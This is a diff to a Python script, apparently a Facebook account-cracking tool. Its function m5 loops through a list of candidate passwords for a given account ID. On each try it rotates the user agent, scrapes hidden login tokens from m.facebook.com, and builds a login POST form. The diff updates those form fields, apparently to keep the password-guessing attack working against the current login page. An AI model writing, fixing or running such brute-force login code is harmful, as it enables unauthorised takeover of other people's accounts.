@@ -1255,29 +1255,19 @@ def m5(idf,pwv):
   for ps in pwv:
    session = requests.Session()
    pro = random.choice(ugen)
-   lgnjs = generate_lgnjs()
-   encpass = generate_encpass()
    free_fb = session.get('https://m.facebook.com').text
    log_data ={
-        'email': idf, 
-        'cuid': '',
-        'guid': re.search(r'name="guid" value="(.*?)"', free_fb).group(1),
-        'lgnjs': re.search(r'name="lgnjs" value="(.*?)"', free_fb).group(1),
-        'lgnrnd': re.search(r'name="lgnrnd" value="(.*?)"', free_fb).group(1),
-        'locale': 'en_GB',
-        'login_source': 'comet_login_header',
-        'next': 'https://www.facebook.com/PHP/',
-        'skstamp': '',
-        'timezone': '-330',
-        'prefill_contact_point': '',
-        'prefill_source': '',
-        'lsd': re.search(r'name="lsd" value="(.*?)"', free_fb).group(1),
-        'jazoest': re.search(r'name="jazoest" value="(.*?)"', free_fb).group(1),
-        'lgndim': re.search(r'name="lgndim" value="(.*?)"', free_fb).group(1),
-        'ab_test_data': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA',
-        'encpass': encpass,
-        'pass': ps,
-        'login': 'Log In'}
+    'email': idf,
+    'pass': ps,
+    'guid': re.search(r'name="guid" value="(.*?)"', free_fb).group(1),
+    'lgnrnd': re.search(r'name="lgnrnd" value="(.*?)"', free_fb).group(1),
+    'lgndim': re.search(r'name="lgndim" value="(.*?)"', free_fb).group(1),
+    'lsd': re.search(r'name="lsd" value="(.*?)"', free_fb).group(1),
+    'jazoest': re.search(r'name="jazoest" value="(.*?)"', free_fb).group(1),
+    'lgnjs': re.search(r'name="lgnjs" value="(.*?)"', free_fb).group(1),
+    'locale': 'en_GB',
+    'login_source': 'comet_headerless_login',
+    'login': 'Log In'}
    header_freefb = {
     "authority": "m.facebook.com",
     "method": "POST",
